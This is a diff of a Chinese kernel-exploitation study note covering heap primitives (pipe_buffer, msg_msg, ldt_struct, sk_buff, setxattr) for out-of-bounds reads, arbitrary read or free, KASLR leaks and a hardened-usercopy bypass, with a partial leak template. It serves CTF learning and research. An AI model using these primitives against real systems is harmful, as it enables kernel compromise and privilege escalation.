@@ -382,6 +382,7 @@ struct callback_head {
 
 - 通过`void pipe(int fd[])`函数来打开
 - 同时打开`pipe_inode_info`和`pipe_buffer`两个结构体
+- **需要注意的是需要写`pipe_fd[1]`成功后才会初始化`pipe_buffer`**
 - `pipe_inode_info`的大小为`kmalloc-192`，分配`flag`为`GFP_KERNEL_ACCOUNT`
 - `pipe_buffer`的大小为`kmalloc-1k`（注意为`1024`），分配`flag`为`GFP_KERNEL_ACCOUNT`
 
@@ -395,6 +396,20 @@ struct callback_head {
 int pipe_fd[2];
 pipe(pipe_fd);
 ```
+
+要获得`pipe_buffer`还需要往管道写数据：
+
+```c
+int pipe_fd[2];
+if (pipe(pipe_fd) < 0){
+    err_exit("Failed to open pipe.");
+}
+if (write(pipe_fd[1], temp, 0x8) < 0){
+    err_exit("Failed to write pipe.");
+}
+```
+
+
 
 #### 魔数
 
@@ -440,7 +455,7 @@ struct pipe_inode_info {
 };
 ```
 
-与另一个结构体`pipe_buffer`：
+与另一个结构体`pipe_buffer`（为什么是`kmalloc-1k`？因为实际上创建`pipe`时会有诸多个该结构体）：
 
 ( `kmalloc-1k | GFP_KERNEL_ACCOUNT` )
 
@@ -508,7 +523,483 @@ struct pipe_buf_operations {
 
 其`rdi`和`rsi`均可控，`rdi`为`struct pipe_inode_info`，`rsi`为`struct pipe_buffer`。
 
+（因此，或许可以利用`gadget`将栈迁移到`pipe_buffer`。或许可以`push rsi; pop rsp`？）
 
+## 0x04. msg_msg (kmalloc-any | GFP_KERNEL_ACCOUNT)
+
+### 属性
+
+#### 总结
+
+- 几乎任意大小的对象分配，修改`m_ts`达到越界读泄露数据。
+
+
+#### 详解
+
+首先其结构如下所示：
+
+![img](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202410081433135.jpeg)
+
+上面左边第一个结构体为`msg_msg`，其大小是我们指定的。若超过一页，则才会继续分配`msg_msgseg`结构体。
+
+在`msg_msg`结构体中，前`0x30`大小的为`header`，是不包括在用户申请的大小的。其余每个字段的解释如下：
+
+- 第一个为`struct list_head m_list`，大小为`0x10`。为一个`msg_msg`的双向链表。**该结构体中两个指针不能覆盖为非法地址，否则会发生错误。常见于通过`msg_rev`时，未设置`MSG_COPY`时，其会释放`msg_msg`从而检查这两个字段。**
+- 第二个为`m_type`，其表示消息种类，例如我们发送消息时将其设置为`1`，则接受时也需要设置为`1`。可以任意指定，但不能设置为`0`，笔者暂不清楚原因，只是自己尝试的时候发现设置为`0`时会报错。
+- 第三个为`m_ts`，表示消息的大小。注意，该大小不包括`header`的大小。将该值改大，即可越界读数据来泄露地址。很显然，若`next`指针为`NULL`，那么该值最大为`0x1000 - 0x30`。
+- 第四个为`struct msg_msgseg* next`，指向同一个消息剩下的部分，即为`struct msg_msgseg`。**将该指针劫持为任意地址，可以有两个用法：1. 通过`msg_recv`设置`MSG_COPY`，可以任意地址读；2. 通过`msg_recv`不设置`MSG_COPY`，可以任意地址释放。**但任意地址释放又要注意，需要指针指向的地方为`NULL`才可以。
+- 第五个为`void* security`，同样知道不能覆盖即可。
+- 使用`MSG_COPY`标志位时需要注意：1. 使用`MSG_COPY`时的`msgrcv`需要保证读取的字节数完全等于（实际上小于等于即可，但明显我们需要等于）此时的`m_ts`，否则会报错；2. 使用`MSG_COPY`时的`msgrcv`中的第四个参数`m_type`和平常不同，其表示按顺序的第几个消息，而不是像以前那样按序号。
+
+
+
+在分配、读取、释放对象之前，我们需要先获得一个消息的`id`，用于标识`msg`：
+
+```c
+int get_msg_queue(void)
+{
+    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+}
+
+```
+
+我们通过发送消息，来进行对象的分配，如下所示：
+
+值得注意的是，分配后的整个`obj`的大小为我们申请的大小加上`header=0x30`。
+
+```c
+/**
+ * msgid  表示消息的id
+ * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
+ * msgsz  表示消息的大小，也就是msg_msg的m_ts
+ * msgtyp 表示消息的种类
+ */
+int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    ((struct msgbuf*)msgp)->mtype = msgtyp;
+    return msgsnd(msqid, msgp, msgsz, 0);
+}
+
+```
+
+对于接受消息（读取内容），根据设置的`flag`不同，有两种接受策略，一是设置`MSG_COPY`字段，其单纯查看消息。二是不设置`MSG_COPY`字段，其会接受消息后，销毁原有消息。封装后如下所示。
+
+仅仅接受消息，不销毁：
+
+```c
+/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
+/**
+ * msgid  表示消息的id
+ * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
+ * msgsz  表示消息的大小，也就是msg_msg的m_ts
+ * msgtyp 表示消息的种类
+ */
+int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    return msgrcv(msqid, msgp, msgsz, msgtyp, 
+                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
+}
+```
+
+接受消息，并释放（`kfree`）：
+
+```c
+/**
+ * msgid  表示消息的id
+ * msgp   表示存储消息的指针，前八个字节需要用于存放消息的种类
+ * msgsz  表示消息的大小，也就是msg_msg的m_ts
+ * msgtyp 表示消息的种类
+ */
+int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
+}
+
+```
+
+### 结构体补充
+
+首先是`msg_queue`，对于每一个`msgget`都有一个：
+
+```c
+/* one msq_queue structure for each present queue on the system */
+struct msg_queue {
+	struct kern_ipc_perm q_perm;
+	time64_t q_stime;		/* last msgsnd time */
+	time64_t q_rtime;		/* last msgrcv time */
+	time64_t q_ctime;		/* last change time */
+	unsigned long q_cbytes;		/* current number of bytes on queue */
+	unsigned long q_qnum;		/* number of messages in queue */
+	unsigned long q_qbytes;		/* max number of bytes on queue */
+	struct pid *q_lspid;		/* pid of last msgsnd */
+	struct pid *q_lrpid;		/* last receive pid */
+
+	struct list_head q_messages;  // 只有一条消息时，指向msg_msg的m_list
+	struct list_head q_receivers;
+	struct list_head q_senders;
+} __randomize_layout;
+```
+
+此外是`msg_msg`：
+
+```c
+/* one msg_msg structure for each message */
+struct msg_msg {
+	struct list_head m_list; // 只有一条消息时，指向msg_queue的q_messages
+	long m_type;
+	size_t m_ts;		/* message text size */
+	struct msg_msgseg *next;
+	void *security;
+	/* the actual message follows immediately */
+};
+```
+
+
+
+## 0x05.  ldt_struct (kmalloc-16(slub)/kmalloc-32(slab) | GFP_KERNEL)
+
+该结构体相关的系统调用类似一个菜单，因此我们没有按照统一的方式来进行编写
+
+其主要的作用是：
+
+- 通过修改`ldt->entries`，配合`read_ldt`进行任意地址读
+- 绕过`harden usercopy`，可以通过`fork`创建子进程并通过子进程来`read_ldt`
+
+### 结构体
+
+```c
+struct ldt_struct {
+    /*
+     * Xen requires page-aligned LDTs with special permissions.  This is
+     * needed to prevent us from installing evil descriptors such as
+     * call gates.  On native, we could merge the ldt_struct and LDT
+     * allocations, but it's not worth trying to optimize.
+     */
+    struct desc_struct    *entries;
+    unsigned int        nr_entries;
+
+    /*
+     * If PTI is in use, then the entries array is not mapped while we're
+     * in user mode.  The whole array will be aliased at the addressed
+     * given by ldt_slot_va(slot).  We use two slots so that we can allocate
+     * and map, and enable a new LDT without invalidating the mapping
+     * of an older, still-in-use LDT.
+     *
+     * slot will be -1 if this LDT doesn't have an alias mapping.
+     */
+    int            slot;
+};
+```
+
+### 系统调用
+
+通过一个叫做`modify_ldt`的系统调用来进行，该系统调用的源码如下：
+
+```c
+SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
+        unsigned long , bytecount)
+{
+    int ret = -ENOSYS;
+
+    switch (func) {
+    case 0:
+        ret = read_ldt(ptr, bytecount);
+        break;
+    case 1:
+        ret = write_ldt(ptr, bytecount, 1);
+        break;
+    case 2:
+        ret = read_default_ldt(ptr, bytecount);
+        break;
+    case 0x11:
+        ret = write_ldt(ptr, bytecount, 0);
+        break;
+    }
+    /*
+     * The SYSCALL_DEFINE() macros give us an 'unsigned long'
+     * return type, but tht ABI for sys_modify_ldt() expects
+     * 'int'.  This cast gives us an int-sized value in %rax
+     * for the return code.  The 'unsigned' is necessary so
+     * the compiler does not try to sign-extend the negative
+     * return codes into the high half of the register when
+     * taking the value from int->long.
+     */
+    return (unsigned int)ret;
+}
+```
+
+其中，我们常用到`read_ldt`和`write_ldt`两种系统调用，用户需要传递三个参数，分别为`func`函数、`ptr`指向`struct user_desc`的指针，和`bytecount`。
+
+其调用方法常常如下：
+
+`read_ldt`：
+
+```c
+syscall(SYS_modify_ldt, 0, (struct user_desc*)&strct, bytecount); // bytecount为读取的字节数
+```
+
+`write_ldt`:
+
+```c
+syscall(SYS_modify_ldt, 1, (struct user_desc*)&strct, sizeof(strct));
+```
+
+### read_ldt
+
+主要存在如下逻辑：
+
+```c
+static int read_ldt(void __user *ptr, unsigned long bytecount)
+{
+//...
+    if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
+        retval = -EFAULT;
+        goto out_unlock;
+    }
+//...
+out_unlock:
+    up_read(&mm->context.ldt_usr_sem);
+    return retval;
+}
+```
+
+可以看到其使用`copy_to_user`向用户的`user_desc`结构体拷贝了数据。因此，若能够控制`ldt->entries`，相当于实现了内核任意地址读。
+
+另一方面，在`ldt_struct`结构体的中的`entries`指针也位于第一个字段，控制起来也比较方便。
+
+需要注意的是使用时需要注意`desc`的编写，具体值可以参照下面的数据泄露模板中的值。
+
+### write_ldt
+
+其会使用`alloc_ldt_struct()`函数来分配一个新的`ldt_struct`，并将其应用到进程，其主要逻辑如下：
+
+```c
+/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */
+static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
+{
+    struct ldt_struct *new_ldt;
+    unsigned int alloc_size;
+
+    if (num_entries > LDT_ENTRIES)
+        return NULL;
+
+    new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL);
+//...
+```
+
+可以看到其会直接分配一个`GFP_KERNEL`的`obj`。
+
+通过`read_ldt`和`write_ldt`，不难想到在`UAF`时可以配合实现内核任意地址读。
+
+### 绕过hardened usercopy
+
+只需要通过`fork`创建子进程，然后使用子进程来`read_ldt`就可以。
+
+**笔者这里其实不太清楚绕过该保护的细节：虽然在`fork`时，会将父进程的`ldt`拷贝给子进程，该阶段完全处于内核态，不会被检测到；但子进程仍然需要调用`read_ldt`来从内核态将数据拷贝到用户态不是吗？为什么这里绕过了笔者还不太清楚。**
+
+### 数据泄露模板
+
+来自`arttnba3`师傅：
+
+```c
+/* this should be referred to your kernel */
+#define SECONDARY_STARTUP_64 0xffffffff81000060
+
+	struct user_desc desc;
+	uint64_t page_offset_base;
+	uint64_t secondary_startup_64;
+	uint64_t kernel_base = 0xffffffff81000000, kernel_offset;
+	uint64_t search_addr, result_addr = -1;
+	uint64_t temp;
+	char *buf;
+    int pipe_fd[2];
+
+    /* init descriptor info */
+    desc.base_addr = 0xff0000;
+    desc.entry_number = 0x8000 / 8;
+    desc.limit = 0;
+    desc.seg_32bit = 0;
+    desc.contents = 0;
+    desc.limit_in_pages = 0;
+    desc.lm = 0;
+    desc.read_exec_only = 0;
+    desc.seg_not_present = 0;
+    desc.useable = 0;
+
+	/**
+	 * do something to make the following ldt_struct to be modifiable,
+	 * e.g. alloc and free a 32B GFP_KERNEL object under a UAF. 
+	 * 
+	 * Your code here:
+	 */
+
+    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
+
+    /* leak kernel direct mapping area by modify_ldt() */
+    while(1) {
+        /**
+         * do something to modify the ldt_struct->entries
+         * Your code here:
+         */
+
+        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
+        if (retval > 0) {
+            printf("[-] read data: %llx\n", temp);
+            break;
+        }
+        else if (retval == 0) {
+            err_exit("no mm->context.ldt!");
+        }
+        page_offset_base += 0x1000000;
+    }
+    printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%llx\n", 
+           page_offset_base);
+
+	/* leak kernel base from direct mappinig area by modify_ldt() */
+    /**
+	 * do something there to modify the ldt_struct->entries 
+	 * to page_offset_base + 0x9d000, pointer of secondary_startup_64() is here,
+	 * read it out and we can get the base of `.text` segment.
+	 * 
+	 * Your code here:
+	 */
+
+    syscall(SYS_modify_ldt, 0, &secondary_startup_64, 8);
+    kernel_offset = secondary_startup_64 - SECONDARY_STARTUP_64;
+    kernel_base += kernel_offset;
+    printf("\033[34m\033[1m[*]Get addr of secondary_startup_64: \033[0m%llx\n",
+           secondary_startup_64);
+    printf("\033[34m\033[1m[+] kernel_base: \033[0m%llx\n", kernel_base);
+    printf("\033[34m\033[1m[+] kernel_offset: \033[0m%llx\n", kernel_offset);
+
+	/* search for something in kernel space */
+	pipe(pipe_fd);
+    buf = (char*) mmap(NULL, 0x8000, 
+                        PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 
+                        0, 0);
+    while(1) {
+        /**
+         * modify the ldt_struct->entries to `search_addr` here,
+         * if you have to modify the ldt_struct->nr_entries at the same time,
+         * set it to `0x8000 / 8` is just okay.
+         *
+         * Your code here:
+         */
+
+        if (!fork()) {
+            /* child process */
+            char *find_addr;
+
+            syscall(SYS_modify_ldt, 0, buf, 0x8000);
+            /* search for what you want there, this's an example */
+            find_addr = memmem(buf, 0x8000, "arttnba3", 8);
+            if (find_addr) {
+                result_addr = search_addr + (uint64_t)(find_addr - buf);
+            }
+            write(pipe_fd[1], &result_addr, 8);
+            exit(0);
+        }
+        /* parent process */
+        wait(NULL);
+        read(pipe_fd[0], &result_addr, 8);
+        if (result_addr != -1) {
+            break;
+        }
+        search_addr += 0x8000;
+    }
+
+    printf("\033[34m\033[1m[+] Obj found at addr: \033[0m%llx\n", result_addr);
+```
+
+## 0x06. sk_buff(大于kmalloc-512的任意obj读写)
+
+类似于`setxattr`，但`sk_buff`功能更强大，但仅适用于`kmalloc-512`以上的`obj`。
+
+### 功能
+
+可以分配任意大于等于`kmalloc-512`的`obj`并写入内容，还可以读取内容同时`free`。
+
+`sk_buff`本身是`linux kernel`中网络协议栈的一个结构体。其指示一个数据包的`head`、`tail`等信息。其结构体本身不太可控且会从独立的`slub`中分配，但它会将用户输入的内容用常规的`kmalloc`分配，其大小为用户数据加上一个`tail`尾部数据。由于尾部数据大小为`320`字节，因此最小分配的`obj`也是`kmalloc-512`。
+
+### 定义
+
+使用前需要先初始化。
+
+```c
+int sk_socket[2];
+
+int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket);
+if (ret < 0)
+{
+    err_exit("Failed to initial sk_socket.");
+}
+```
+
+### 分配 & 编辑
+
+很简单，直接`write`写入用户的内容即可。
+
+```c
+// 第二个参数为写入的内容，第三个参数为写入的大小减去320，320为尾部大小
+// 例如这里要申请一个kmalloc-1024即0x400的obj，则第三个参数为0x400-320
+int ret = write(sk_socket[0], buf, 0x400 - 320);
+if (ret < 0)
+{
+    err_exit("Failed to send sk_buf.");
+}
+```
+
+### 释放 & 读取
+
+同样很简单，通过`read`读取用户内容即可。注意这里接收数据的同时还会释放`obj`。
+
+```c
+int ret = read(sk_socket[1], buf, 0x400 - 320);
+if (ret < 0)
+{
+    err_exit("Failed to recv sk_buf.");
+}
+```
+
+
+
+
+
+## 0x00. 
+
+### 属性
+
+#### 总结
+
+- 
+
+#### 打开方式
+
+
+
+#### 魔数
+
+
+
+#### 利用效果
+
+- 
+
+#### 结构体
+
+
+
+### 利用
+
+#### 数据泄露 - 内核基地址
+
+
+
+#### 数据泄露 - 堆地址
+
+
+
+#### 劫持程序控制流
 
 # 实用结构体/函数
 
@@ -659,6 +1150,12 @@ static long setxattr(struct dentry *d, const char __user *name, const void __use
 **可以看到其实现了一个任意大小的`obj`申请,并且其内容也完全由我们控制!**
 
 但不幸的是,该`obj`分配过后,随机就会被释放掉,导致其没有干任何事~
+
+### 利用 - 实现改写obj
+
+虽然我们编辑内容后其会被释放掉，但我们仍然可以编辑其除了`freelist`的内容。
+
+例如，若存在一个`UAF`，我们可以申请一个`msg_msg`结构体，并使用`setxattr`来申请回来改写`m_ts`实现越界数据读，或者改写`next`指针实现任意地址读~
 
 ### 利用 - 结合userfaultfd来堆占位
 
